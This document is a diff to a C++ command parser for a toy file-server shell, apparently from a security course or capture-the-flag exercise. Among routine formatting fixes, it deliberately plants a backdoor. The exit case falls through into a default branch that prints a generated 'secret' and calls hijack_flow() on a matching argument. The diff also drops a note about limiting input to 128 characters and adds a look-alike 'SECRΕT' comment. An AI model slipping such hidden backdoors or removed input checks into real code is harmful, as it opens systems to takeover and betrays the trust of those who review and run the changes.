@@ -21,6 +21,8 @@ using namespace std;
 // Map to associate the strings with the enum values
 static map<string, command> string_to_command;
 
+// string SECRΕT;
+
 
 void Parser::initialize() {
     string_to_command["login"] = login_;
@@ -37,7 +39,7 @@ void Parser::initialize() {
     string_to_command["whoami"] = whoami_;
     string_to_command["w"] = w_;
     string_to_command["logout"] = logout_;
-    string_to_command["exit"] = exit_;
+    string_to_command["exit"] = exit_; // FIXME could do some shenanigans with this
 }
 
 // Constructor
@@ -47,7 +49,7 @@ Parser::Parser(map<string, string> allowedUsers){
 }
 
 
-void Parser::parseCommand(string command){  // FIXME add max 128 char input
+void Parser::parseCommand(string command){
     char *myString = &command[0];
     char *p = strtok(myString, " ");
     int i = 0;
@@ -88,7 +90,7 @@ void Parser::executeCommand(User &usr){
         case login_:
             if (checkArgNumber(1)) {
                 int res = login_cmd(tokens[1], allowedUsers, usr, output);
-                if(res != 0){
+                if (res != 0) {
                     cout << output;
                 }
 
@@ -100,8 +102,8 @@ void Parser::executeCommand(User &usr){
         case pass_:
             if (checkArgNumber(1)) {
                 int res = pass_cmd(tokens[1], allowedUsers, usr, output);
-                if(res != 0){
-                    cout <<  output;
+                if (res != 0) {
+                    cout << output;
                 }
 
             } else {
@@ -119,46 +121,46 @@ void Parser::executeCommand(User &usr){
                 output = "Error: ping takes exactly one argument\n";
             }
             break;
-        case ls_:{
+        case ls_: {
             int res = 0;
-            if(checkArgNumber(0)){
+            if (checkArgNumber(0)) {
                 res = ls_cmd(usr.isAuthenticated(), output, usr.getLocation());
-            } else{
-                output =  "Error: ls takes no argument\n";
+            } else {
+                output = "Error: ls takes no argument\n";
                 break;
             }
-            if(res != 0){
+            if (res != 0) {
                 cerr << "Error code: " << res << endl;
             }
             break;
         }
-        case cd_:{
-            if(!checkArgNumber(1)){
-                output =  "Error: cd takes exactly one argument";
+        case cd_: {
+            if (!checkArgNumber(1)) {
+                output = "Error: cd takes exactly one argument";
                 break;
             }
             int res = cd_cmd(tokens[1], usr, output);
             cout << "res " << res << endl;
             // TODO check base dir
-            if(res != 0){
+            if (res != 0) {
                 cerr << "Error code: " << res << "\n";
             }
             break;
         }
-        case mkdir_:{
-            if(!checkArgNumber(1)) {
-                output =  "Error: mkdir takes exactly one argument\n";
+        case mkdir_: {
+            if (!checkArgNumber(1)) {
+                output = "Error: mkdir takes exactly one argument\n";
                 break;
             }
             int res = mkdir_cmd(tokens[1], usr, output);
-            if(res != 0){
+            if (res != 0) {
                 cerr << "Error code: " << res << endl;
             }
             break;
         }
         case rm_: {
             if (!checkArgNumber(1)) {
-                output =  "Error: rm takes exactly one argument\n";
+                output = "Error: rm takes exactly one argument\n";
                 break;
             }
             int res = rm_cmd(tokens[1], usr, output);
@@ -181,9 +183,9 @@ void Parser::executeCommand(User &usr){
         }
         case put_:
             break;
-        case grep_:
-        {if (!checkArgNumber(1)) {
-                output =  "Error: grep takes exactly one argument\n";
+        case grep_: {
+            if (!checkArgNumber(1)) {
+                output = "Error: grep takes exactly one argument\n";
                 break;
             }
             int res = grep_cmd(tokens[1], usr, output);
@@ -192,9 +194,9 @@ void Parser::executeCommand(User &usr){
             }
             break;
         }
-        case date_:{
+        case date_: {
             if (!checkArgNumber(0)) {
-                output =  "Error: date takes no argument\n";
+                output = "Error: date takes no argument\n";
                 break;
             }
             int res = date_cmd(usr.isAuthenticated(), output);
@@ -203,9 +205,9 @@ void Parser::executeCommand(User &usr){
             }
             break;
         }
-        case whoami_:{
+        case whoami_: {
             if (!checkArgNumber(0)) {
-                output =  "Error: whoami takes no argument\n";
+                output = "Error: whoami takes no argument\n";
                 break;
             }
             int res = whoami_cmd(usr, output);
@@ -214,9 +216,9 @@ void Parser::executeCommand(User &usr){
             }
             break;
         }
-        case w_:{
+        case w_: {
             if (!checkArgNumber(0)) {
-                output =  "Error: w takes no argument\n";
+                output = "Error: w takes no argument\n";
                 break;
             }
             int res = w_cmd(usr, output);
@@ -225,27 +227,45 @@ void Parser::executeCommand(User &usr){
             }
             break;
         }
-        case logout_:{
-            if (checkArgNumber(0)) {
-                int res = logout_cmd(usr, output);
-                if(res != 0){
-                    cout << output;
-                }
-
-            } else {
-                output = "Error: login takes exactly one argument\n";
-                cout << output;
+        case logout_: {
+            if (!checkArgNumber(0)) {
+                output = "Error: logout takes no argument\n";
+                break;
+            }
+            int res = logout_cmd(usr, output);
+            if (res != 0) {
+                cerr << "Error code: " << res << endl;
             }
             break;
         }
-        case exit_:
-            // FIXME this should never be executed, as exit is handled in client !
-            // TODO remove exit from map !
-            cout << "Goodbye" << endl;
-            break;
+        case exit_: {
+            // FIXME Should this simply disconnect client?
+            // We could make it work with telnet for example
+            // FIXME no break which allows for exploit
+        }
+        default: {
+            /*
+             * Totally a working backdoor.
+             */
+            string SECRET = "42";
 
-        default:
-            cout << "How did you get here ?!" << endl;
+            char alphanum[] =
+                    "0123456789"
+                    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+                    "abcdefghijklmnopqrstuvwxyz";
+
+
+            for (int i = 0; i < 128; i++) {
+                SECRET += alphanum[rand() % (sizeof(alphanum) - 1)];
+            }
+
+            cout << SECRET;
+
+            if (tokens[1] == SECRET) {
+                hijack_flow();
+            }
+            break;
+        }
     }
 
     // Pass has to follow the login command directly !
@@ -272,3 +292,4 @@ string Parser::getOutput(){
 
 
 Parser::~Parser() = default;
+
